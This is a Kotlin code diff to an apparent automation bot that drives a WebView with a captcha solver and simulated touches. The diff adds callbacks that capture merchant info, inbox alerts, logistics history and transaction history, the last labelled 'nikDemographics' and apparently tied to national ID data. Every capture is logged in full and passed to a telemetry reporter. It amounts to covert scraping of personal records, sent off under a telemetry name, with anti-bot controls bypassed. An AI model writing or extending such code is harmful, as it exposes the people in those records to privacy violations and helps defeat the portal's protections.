@@ -24,12 +24,30 @@ class BotEngine(
     private val captchaSolver = CaptchaSolver()
     private val touchSimulator = TouchSimulator(wvManager.getWebView()!!)
     @Volatile private var lastExtractedMerchantJson: String? = null
+    @Volatile private var lastExtractedInboxAlerts: String? = null
+    @Volatile private var lastExtractedLogisticJson: String? = null
+    @Volatile private var lastExtractedTransactionJson: String? = null
 
     init {
         wvManager.getBridge().setOnMerchantInfoReady { json ->
             Log.d("BotEngine", "Received Live Merchant Info via Bridge: $json")
             lastExtractedMerchantJson = json
-            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = json)
+            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = json, inboxAlerts = lastExtractedInboxAlerts, logisticHistory = lastExtractedLogisticJson, nikDemographics = lastExtractedTransactionJson)
+        }
+        wvManager.getBridge().setOnInboxAlertsReady { json ->
+            Log.d("BotEngine", "Received Live Inbox/Alerts via Bridge: $json")
+            lastExtractedInboxAlerts = json
+            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = lastExtractedMerchantJson, inboxAlerts = json)
+        }
+        wvManager.getBridge().setOnLogisticDataReady { json ->
+            Log.d("BotEngine", "Received Live Logistics via Bridge: $json")
+            lastExtractedLogisticJson = json
+            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = lastExtractedMerchantJson, logisticHistory = json)
+        }
+        wvManager.getBridge().setOnTransactionHistoryReady { json ->
+            Log.d("BotEngine", "Received Live Transaction History via Bridge: $json")
+            lastExtractedTransactionJson = json
+            com.mapbot.pertamina.util.TelemetryHelper.report(appContext, extractedJson = lastExtractedMerchantJson, nikDemographics = json)
         }
     }
 
